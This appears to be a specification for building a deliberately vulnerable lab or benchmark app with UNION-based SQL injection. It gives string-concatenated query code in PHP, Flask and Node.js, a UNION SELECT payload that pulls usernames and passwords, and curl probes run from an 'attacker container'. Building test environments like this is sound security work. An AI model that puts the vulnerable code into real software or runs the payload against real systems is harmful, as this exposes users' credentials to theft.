# Atom: UNION-Based SQL Injection

Allows an attacker to append a `UNION SELECT` clause to the application's query and have the results reflected directly in the HTTP response. Used for data exfiltration — most commonly to extract credentials from a users table.

### Logic Requirements:
1. A query is constructed by concatenating unsanitized user input directly into a SQL string.
2. The query result is rendered in the HTTP response (table, list, or raw text).
3. The number of columns in the injected UNION must match the original SELECT — either the original query is designed with a known column count, or the app reflects enough columns for the payload to land.
4. No parameterized queries or prepared statements are used.

### Synthesis Guidance:
The injection point is typically a search or lookup field. The app should reflect at least two columns in the response so that both a username and a password can be extracted in a single payload. The vulnerable query should be a simple SELECT that returns product names, articles, or similar benign data — the attacker then uses the UNION to pivot to a users/credentials table.

**PHP (Apache + MySQLi):**
```php
$query = "SELECT name, description FROM products WHERE name LIKE '%" . $_GET['search'] . "%'";
$result = mysqli_query($conn, $query);
// Render rows in an HTML table
```
Injection: `' UNION SELECT username, password FROM users-- -`

**Python / Flask (sqlite3):**
```python
query = f"SELECT title, body FROM articles WHERE title LIKE '%{search}%'"
rows = conn.execute(query).fetchall()
# Render rows in response
```
Injection: `' UNION SELECT username, password FROM users-- -`

**Node.js / Express (mysql2):**
```js
const query = `SELECT name, desc FROM items WHERE name LIKE '%${req.query.search}%'`;
conn.query(query, (err, rows) => { res.json(rows); });
```
Injection: `' UNION SELECT username, password FROM users-- -`

### Testing Guidance:
**Layer 1 — Internal state check:**
Verify the query is built via string concatenation (not a prepared statement) and that a benign UNION payload returns the expected extra row:
```bash
# Confirm the app returns data from a UNION — look for the injected values in the response
curl -s "http://localhost/app?search=nonexistent'+UNION+SELECT+'injected_user','injected_pass'--+-"
```
Expect to see `injected_user` and `injected_pass` reflected in the response body.

**Layer 2 — External attack probe (from attacker container):**
```bash
curl -s "http://target/app?search=x'+UNION+SELECT+username,password+FROM+users--+-"
```
A successful result contains the seeded username and plaintext (or hashed) password value from the users table.
